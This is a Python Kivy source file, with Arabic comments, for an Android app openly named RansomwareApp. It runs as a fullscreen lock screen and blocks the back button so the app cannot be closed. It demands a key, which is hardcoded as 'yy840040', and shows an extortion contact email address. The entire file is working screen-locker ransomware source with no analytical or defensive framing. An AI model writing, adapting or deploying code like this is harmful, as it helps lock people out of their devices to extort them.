from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import get_color_from_hex



# ضبط الشاشة لتكون ملء الشاشة وإخفاء شريط الحالة
Window.fullscreen = 'auto'

class RansomwareApp(App):
    def build(self):
        # تعيين لون الخلفية إلى رمادي غامق جداً
        Window.clearcolor = get_color_from_hex('#1A1A1A')
        
        # اعتراض زر الرجوع في الأندرويد لمنع إغلاق التطبيق منه
        Window.bind(on_request_close=self.on_request_close)

        # المخطط الرئيسي للواجهة
        layout = BoxLayout(orientation='vertical', padding=40, spacing=20)

        # مساحة مرنة علوية لدفع العناصر إلى المنتصف
        layout.add_widget(Label(size_hint_y=0.3))

        # 1. النص العلوي بالإنجليزية
        self.label_title = Label(
            text="Invalid key please try again", 
            font_size='22sp', 
            color=(1, 1, 1, 1),
            size_hint_y=None,
            height=60
        )
        layout.add_widget(self.label_title)

        # 2. حقل إدخال النص (الـ Entry)
        self.entry = TextInput(
            multiline=False, 
            size_hint_y=None, 
            height=55, 
            font_size='20sp',
            password=True,
            padding=[10, 10, 10, 10]
        )
        layout.add_widget(self.entry)

        # 3. زر الدخول
        self.btn = Button(
            text="ok", 
            size_hint_y=None, 
            height=60, 
            background_color=get_color_from_hex('#FFFFFF'),
            color=(0, 0, 0, 1),
            font_size='18sp'
        )
        self.btn.bind(on_press=self.clos) 
        layout.add_widget(self.btn)

        # مساحة مرنة سفلية لدفع الإيميل إلى قاع الشاشة
        layout.add_widget(Label(size_hint_y=1))

        # 4. النص السفلي (الايميل)
        self.label_email = Label(
            text="Contact: cshkotan@protonmail.com", 
            font_size='16sp', 
            color=(1, 1, 1, 1),
            size_hint_y=None,
            height=40
        )
        layout.add_widget(self.label_email)

        
        
        return layout

    def clos(self, instance):
        key = "yy840040"
        if self.entry.text.strip() == key:
            self.exit_app()
        else:
            self.label_title.text = "Wrong Key! Try Again"
            self.label_title.color = (1, 0, 0, 1) 

    def exit_app(self):
        Window.close()
        App.get_running_app().stop()

    def on_request_close(self, *args):
        # تمنع إغلاق التطبيق عند الضغط على زر Back في الأندرويد
        return True

if __name__ == '__main__':
    RansomwareApp().run()
